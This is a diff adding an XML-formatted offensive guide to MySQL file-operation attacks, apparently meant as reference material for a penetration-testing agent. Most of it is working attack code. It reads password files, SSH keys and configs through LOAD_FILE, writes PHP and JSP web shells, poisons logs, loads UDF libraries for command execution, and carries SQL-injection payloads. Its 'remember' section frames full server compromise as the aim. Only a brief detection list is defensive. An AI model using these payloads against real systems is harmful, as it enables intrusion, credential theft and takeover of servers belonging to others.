@@ -1,0 +1,250 @@
+<vulnerability_guide>
+  <title>MYSQL FILE OPERATIONS</title>
+
+  <critical>MySQL's file operation functions (LOAD_FILE, INTO OUTFILE/DUMPFILE) enable reading and writing arbitrary files when the FILE privilege is granted. Combined with SQL injection, these capabilities allow reading sensitive files, writing web shells, and achieving full server compromise.</critical>
+
+  <scope>
+    - LOAD_FILE for reading files
+    - INTO OUTFILE/DUMPFILE for writing
+    - Secure_file_priv bypass
+    - Web shell deployment
+    - UDF exploitation
+    - Log file poisoning
+  </scope>
+
+  <methodology>
+    1. PRIVILEGE ENUMERATION
+       {% raw %}
+       # Check FILE privilege
+       SELECT user, file_priv FROM mysql.user WHERE user = CURRENT_USER();
+
+       # Check current user privileges
+       SHOW GRANTS;
+       SELECT * FROM information_schema.user_privileges
+       WHERE privilege_type = 'FILE';
+
+       # Check secure_file_priv
+       SHOW VARIABLES LIKE 'secure_file_priv';
+       # NULL = disabled (can't use file functions)
+       # '' (empty) = unrestricted
+       # '/path/' = restricted to that directory
+       {% endraw %}
+
+    2. READING FILES
+       {% raw %}
+       # Basic file read
+       SELECT LOAD_FILE('/etc/passwd');
+       SELECT LOAD_FILE('/etc/shadow');  # Requires root
+
+       # Common targets:
+       SELECT LOAD_FILE('/var/www/html/config.php');
+       SELECT LOAD_FILE('/var/www/html/.htpasswd');
+       SELECT LOAD_FILE('/home/user/.ssh/id_rsa');
+       SELECT LOAD_FILE('/etc/mysql/my.cnf');
+
+       # Hex encoding for binary files
+       SELECT HEX(LOAD_FILE('/bin/ls'));
+
+       # Via LOAD DATA INFILE (if allowed)
+       CREATE TABLE data (content TEXT);
+       LOAD DATA INFILE '/etc/passwd' INTO TABLE data;
+       SELECT * FROM data;
+       {% endraw %}
+
+    3. WRITING FILES
+       {% raw %}
+       # INTO OUTFILE (creates text file)
+       SELECT 'malicious content' INTO OUTFILE '/tmp/test.txt';
+
+       # INTO DUMPFILE (creates binary file, no newlines)
+       SELECT 0x... INTO DUMPFILE '/tmp/binary.so';
+
+       # Web shell deployment
+       SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+       # Multiple lines
+       SELECT CONCAT('line1\n', 'line2\n') INTO OUTFILE '/tmp/file.txt';
+
+       # Overwrite limitation:
+       # INTO OUTFILE cannot overwrite existing files
+       # INTO DUMPFILE same limitation
+       {% endraw %}
+
+    4. SECURE_FILE_PRIV BYPASS
+       {% raw %}
+       # If secure_file_priv is set to a directory:
+
+       # Option 1: Write to allowed directory
+       SELECT '<?php ...' INTO OUTFILE '/allowed/path/shell.php';
+       # Then access if web-accessible
+
+       # Option 2: Symlink attack (if you can create symlinks)
+       # Create symlink in allowed dir pointing to web root
+
+       # Option 3: Log file poisoning
+       SET GLOBAL general_log = 'ON';
+       SET GLOBAL general_log_file = '/var/www/html/shell.php';
+       SELECT '<?php system($_GET["c"]); ?>';
+       SET GLOBAL general_log = 'OFF';
+
+       # Option 4: UDF library loading
+       # If secure_file_priv includes plugin_dir
+       {% endraw %}
+
+    5. WEB SHELL DEPLOYMENT
+       {% raw %}
+       # Determine web root
+       SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
+       SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
+
+       # Common web roots:
+       # /var/www/html/
+       # /var/www/
+       # /home/user/public_html/
+       # /srv/www/
+
+       # PHP shell
+       SELECT '<?php passthru($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/x.php';
+
+       # JSP shell (if Tomcat)
+       SELECT '<% Runtime.getRuntime().exec(request.getParameter("c")); %>'
+       INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/x.jsp';
+
+       # Access: http://target/x.php?c=whoami
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <udf_exploitation>
+      {% raw %}
+      # User Defined Function for command execution
+
+      # Step 1: Get UDF library
+      # Compile sys_exec.so or use pre-built
+      # Convert to hex
+
+      # Step 2: Write to plugin directory
+      SHOW VARIABLES LIKE 'plugin_dir';
+      # Usually /usr/lib/mysql/plugin/
+
+      SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+
+      # Step 3: Create function
+      CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
+
+      # Step 4: Execute commands
+      SELECT sys_exec('id > /tmp/output');
+      SELECT sys_exec('whoami');
+
+      # Cleanup
+      DROP FUNCTION sys_exec;
+      {% endraw %}
+    </udf_exploitation>
+
+    <log_file_poisoning>
+      {% raw %}
+      # Abuse MySQL logging
+
+      # General query log
+      SET GLOBAL general_log = 'ON';
+      SET GLOBAL general_log_file = '/var/www/html/shell.php';
+      SELECT '<?php system($_GET["c"]); ?>';
+      SET GLOBAL general_log = 'OFF';
+
+      # Slow query log
+      SET GLOBAL slow_query_log = 'ON';
+      SET GLOBAL slow_query_log_file = '/var/www/html/slow.php';
+      SELECT '<?php system($_GET["c"]); ?>', SLEEP(11);
+      SET GLOBAL slow_query_log = 'OFF';
+
+      # Error log (harder to control content)
+      {% endraw %}
+    </log_file_poisoning>
+
+    <proc_filesystem>
+      {% raw %}
+      # Read /proc for information
+
+      # Process information
+      SELECT LOAD_FILE('/proc/self/cmdline');
+      SELECT LOAD_FILE('/proc/self/environ');
+
+      # Network information
+      SELECT LOAD_FILE('/proc/net/tcp');
+      SELECT LOAD_FILE('/proc/net/arp');
+
+      # Memory maps (information disclosure)
+      SELECT LOAD_FILE('/proc/self/maps');
+
+      # File descriptors
+      SELECT LOAD_FILE('/proc/self/fd/0');
+      {% endraw %}
+    </proc_filesystem>
+
+    <binary_file_handling>
+      {% raw %}
+      # Handle binary content
+
+      # Read binary file as hex
+      SELECT HEX(LOAD_FILE('/bin/ls'));
+
+      # Write binary from hex
+      SELECT UNHEX('7f454c46...') INTO DUMPFILE '/tmp/binary';
+
+      # Base64 alternative
+      SELECT TO_BASE64(LOAD_FILE('/bin/ls'));
+      SELECT FROM_BASE64('...') INTO DUMPFILE '/tmp/decoded';
+
+      # Chunked reading (for large files)
+      SELECT SUBSTR(LOAD_FILE('/large/file'), 1, 10000);
+      SELECT SUBSTR(LOAD_FILE('/large/file'), 10001, 10000);
+      {% endraw %}
+    </binary_file_handling>
+
+    <sqli_file_operations>
+      {% raw %}
+      # File operations through SQL injection
+
+      # UNION-based file read
+      ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 --
+
+      # Stacked query file write
+      '; SELECT '<?php...' INTO OUTFILE '/var/www/shell.php'; --
+
+      # Blind file existence check
+      ' AND (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --
+      # True = file exists and readable
+
+      # Error-based extraction
+      ' AND EXTRACTVALUE(0, CONCAT(0x7e, LOAD_FILE('/etc/passwd'))) --
+      {% endraw %}
+    </sqli_file_operations>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor FILE privilege grants
+    - Alert on LOAD_FILE/INTO OUTFILE usage
+    - Track file creation in web directories
+    - Monitor log file location changes
+    - Check for UDF installation
+  </detection>
+
+  <validation>
+    - Confirm FILE privilege
+    - Successfully read sensitive files
+    - Write file to accessible location
+    - Deploy and access web shell
+    - Document secure_file_priv status
+  </validation>
+
+  <pro_tips>
+    - Empty secure_file_priv = full access, NULL = completely disabled
+    - INTO OUTFILE adds newlines; DUMPFILE is for binary
+    - Log poisoning bypasses secure_file_priv restrictions
+    - Check plugin_dir for UDF possibilities
+    - MySQL runs as mysql user - files must be readable by that user
+    - /proc provides valuable information without file system access
+  </pro_tips>
+
+  <remember>MySQL file operations transform database access into full file system access. Read configuration files for more credentials, write web shells for code execution, or deploy UDFs for direct command execution. The FILE privilege is a gateway privilege - any SQL injection with FILE privilege can likely lead to complete server compromise.</remember>
+</vulnerability_guide>
